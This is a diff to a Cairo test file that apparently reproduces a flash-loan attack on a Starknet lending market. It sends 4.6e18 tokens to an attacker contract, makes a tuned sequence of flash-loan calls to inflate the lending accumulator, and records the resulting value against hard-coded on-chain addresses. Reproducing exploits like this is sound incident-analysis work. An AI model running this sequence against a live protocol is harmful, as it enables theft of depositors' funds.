@@ -9,6 +9,8 @@ const market_address_felt: felt252 =
     0x4c0a5193d58f74fbace4b74dcf65481e734ed1714121bdc571da345540efa05;
 const wstETH_address_felt: felt252 =
     0x0057912720381af14b0e5c87aa4718ed5e527eab60b3801ebf702ab09139e38b;
+const zwstETH_address_felt: felt252 =
+    0x05240577D1d546f1C241b9448a97664c555e4b0d716eD2eE4c43489467f24e29;
 
 fn setup() -> ContractAddress {
     let attacker_class = declare("Attacker").unwrap().contract_class();
@@ -60,10 +62,21 @@ fn test_increase_accumulator() {
     println!("Accumulator {}", accumulator);
 
     // transfer some funds to the attacking contract
-    erc20.transfer(attacker_address, 1000);
+    erc20.transfer(attacker_address, 4_600_000_000_000_000_000);
 
+    // call flashloans, similarly to attacker
+    attacker.call_flash_loan(1000); // 
+    attacker.call_flash_loan(1000);
     attacker.call_flash_loan(1);
+    attacker.call_flash_loan(500_000_000_000_000_001);
+    attacker.call_flash_loan(200_000_000_000_000_001);
+    attacker.call_flash_loan(400_000_000_000_000_001);
+    attacker.call_flash_loan(473_758_753_842_649_863);
+    attacker.call_flash_loan(500_000_000_000_000_001);
+    attacker.call_flash_loan(1_000_000_000_000_000_001);
+    attacker.call_flash_loan(1_200_000_000_000_000_001);
 
     let accumulator = market.get_lending_accumulator(erc20_address);
     println!("Accumulator {}", accumulator);
+    // accumulator at this point is 2034648953025821952 from this run
 }
